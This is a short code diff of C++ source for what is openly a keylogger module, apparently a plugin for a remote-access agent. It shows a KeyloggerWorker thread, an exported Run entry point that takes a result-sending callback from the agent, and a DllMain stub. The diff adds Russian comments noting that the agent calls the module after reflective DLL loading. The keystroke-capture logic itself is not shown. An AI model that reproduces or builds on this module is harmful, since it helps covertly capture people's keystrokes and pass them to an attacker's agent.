@@ -155,6 +155,7 @@ DWORD WINAPI KeyloggerWorker(LPVOID) {
     return 0;
 }
 
+//точка входа модуля, вызываемая агентом после рефлективной загрузки
 extern "C" __declspec(dllexport) int __stdcall Run(ModuleAPI* api) {
     if (!api || !api->send_result) return -1;
     g_send_result = api->send_result;
@@ -164,6 +165,7 @@ extern "C" __declspec(dllexport) int __stdcall Run(ModuleAPI* api) {
     return 0;
 }
 
+// вызывается при загрузке ивыгрузке длл
 BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
     return TRUE;
 }
